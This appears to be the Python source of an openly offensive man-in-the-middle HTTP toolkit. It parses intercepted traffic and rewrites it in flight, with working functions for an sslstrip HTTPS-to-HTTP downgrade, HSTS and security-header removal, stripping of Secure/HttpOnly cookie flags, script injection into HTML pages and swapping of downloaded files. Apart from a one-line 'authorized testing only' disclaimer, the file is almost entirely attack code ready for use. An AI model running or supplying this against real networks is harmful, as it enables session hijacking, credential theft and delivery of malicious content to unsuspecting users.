"""HTTP attack toolkit — parse, transform, and rebuild HTTP messages inline.

Parsing normalizes the body (de-chunks Transfer-Encoding: chunked and decompresses
Content-Encoding: gzip/deflate) so transforms see plaintext; rebuilding emits an
identity, fixed-Content-Length message. Transforms cover:

- sslstrip / HSTS downgrade (rewrite https→http, drop Strict-Transport-Security,
  rewrite Location redirects)
- content / JS injection into HTML
- on-the-fly body (file) replacement
- Set-Cookie Secure/HttpOnly stripping and security-header removal
- forcing cleartext responses (strip Accept-Encoding on requests)

Operates on a complete HTTP message in one TCP segment. Bodies that span multiple
segments need TCP stream reassembly (future work). For authorized testing only.
"""

from __future__ import annotations

import gzip
import re
import zlib
from dataclasses import dataclass, field

_METHODS = ("GET", "POST", "PUT", "HEAD", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT")


@dataclass
class HttpMessage:
    is_response: bool
    start_line: str
    headers: list[tuple[str, str]] = field(default_factory=list)
    body: bytes = b""

    # ---- header helpers -----------------------------------------------------
    def get(self, name: str) -> str | None:
        low = name.lower()
        for k, v in self.headers:
            if k.lower() == low:
                return v
        return None

    def remove(self, name: str) -> bool:
        low = name.lower()
        before = len(self.headers)
        self.headers = [(k, v) for k, v in self.headers if k.lower() != low]
        return len(self.headers) != before

    def set(self, name: str, value: str) -> None:
        low = name.lower()
        for i, (k, _) in enumerate(self.headers):
            if k.lower() == low:
                self.headers[i] = (k, value)
                return
        self.headers.append((name, value))

    def map(self, name: str, fn) -> bool:
        """Rewrite every value of a header via fn(value). Returns True if changed."""
        low = name.lower()
        changed = False
        for i, (k, v) in enumerate(self.headers):
            if k.lower() == low:
                nv = fn(v)
                if nv != v:
                    self.headers[i] = (k, nv)
                    changed = True
        return changed


def parse_http(data: bytes) -> HttpMessage | None:
    if b"\r\n\r\n" not in data:
        # headers-only messages are rare; require a full header block
        if not data.startswith(tuple(m.encode() for m in _METHODS)) and not data.startswith(b"HTTP/"):
            return None
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    if not lines:
        return None
    start = lines[0].decode("latin-1", "replace")
    is_response = start.startswith("HTTP/")
    if not is_response and not start.split(" ", 1)[0] in _METHODS:
        return None

    headers: list[tuple[str, str]] = []
    for ln in lines[1:]:
        if b":" in ln:
            k, _, v = ln.partition(b":")
            headers.append((k.decode("latin-1", "replace").strip(),
                            v.decode("latin-1", "replace").strip()))

    msg = HttpMessage(is_response, start, headers, body)
    _normalize_body(msg)
    return msg


def _normalize_body(msg: HttpMessage) -> None:
    te = (msg.get("Transfer-Encoding") or "").lower()
    if "chunked" in te:
        msg.body = _dechunk(msg.body)
        msg.remove("Transfer-Encoding")
    ce = (msg.get("Content-Encoding") or "").lower()
    if ce:
        try:
            if "gzip" in ce:
                msg.body = gzip.decompress(msg.body)
            elif "deflate" in ce:
                msg.body = zlib.decompress(msg.body)
            msg.remove("Content-Encoding")
        except Exception:
            pass  # leave as-is if we can't decode a partial body


def _dechunk(data: bytes) -> bytes:
    out = bytearray()
    i = 0
    while i < len(data):
        nl = data.find(b"\r\n", i)
        if nl == -1:
            break
        try:
            size = int(data[i:nl].split(b";")[0], 16)
        except ValueError:
            break
        if size == 0:
            break
        start = nl + 2
        out += data[start:start + size]
        i = start + size + 2
    return bytes(out)


def build_http(msg: HttpMessage) -> bytes:
    msg.remove("Content-Length")
    msg.set("Content-Length", str(len(msg.body)))
    head = msg.start_line + "\r\n"
    head += "".join(f"{k}: {v}\r\n" for k, v in msg.headers)
    return head.encode("latin-1", "replace") + b"\r\n" + msg.body


# ---- transforms ------------------------------------------------------------
_HTTPS = re.compile(rb"https://")


def sslstrip(msg: HttpMessage) -> bool:
    """HTTPS→HTTP downgrade + HSTS strip. Returns True if anything changed."""
    changed = False
    if msg.is_response:
        changed |= msg.remove("Strict-Transport-Security")
        changed |= msg.map("Location", lambda v: v.replace("https://", "http://"))
        if _is_texty(msg) and _HTTPS.search(msg.body):
            msg.body = _HTTPS.sub(b"http://", msg.body)
            changed = True
    return changed


def strip_accept_encoding(msg: HttpMessage) -> bool:
    """On requests, drop Accept-Encoding so responses come back uncompressed."""
    if msg.is_response:
        return False
    return msg.remove("Accept-Encoding")


def inject_html(msg: HttpMessage, snippet: bytes, marker: bytes = b"</body>") -> bool:
    """Insert `snippet` just before `marker` in an HTML response body."""
    if not msg.is_response or not _is_html(msg):
        return False
    body = msg.body
    idx = body.lower().rfind(marker.lower())
    if idx == -1:
        msg.body = body + snippet
    else:
        msg.body = body[:idx] + snippet + body[idx:]
    return True


def replace_body(msg: HttpMessage, new_body: bytes, content_type: str | None = None) -> bool:
    """Swap the response body (on-the-fly file replacement)."""
    if not msg.is_response:
        return False
    msg.body = new_body
    if content_type:
        msg.set("Content-Type", content_type)
    return True


def strip_secure_cookie(msg: HttpMessage) -> bool:
    """Remove Secure/HttpOnly/SameSite flags from Set-Cookie headers."""
    def clean(v: str) -> str:
        parts = [p for p in v.split(";")
                 if p.strip().lower() not in ("secure", "httponly")
                 and not p.strip().lower().startswith("samesite")]
        return ";".join(parts)
    return msg.map("Set-Cookie", clean)


def remove_security_headers(msg: HttpMessage) -> bool:
    changed = False
    for h in ("Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options",
              "X-XSS-Protection", "Strict-Transport-Security", "Referrer-Policy"):
        changed |= msg.remove(h)
    return changed


def _is_texty(msg: HttpMessage) -> bool:
    ct = (msg.get("Content-Type") or "").lower()
    return any(t in ct for t in ("text/", "javascript", "json", "xml", "html")) or ct == ""


def _is_html(msg: HttpMessage) -> bool:
    return "html" in (msg.get("Content-Type") or "").lower()
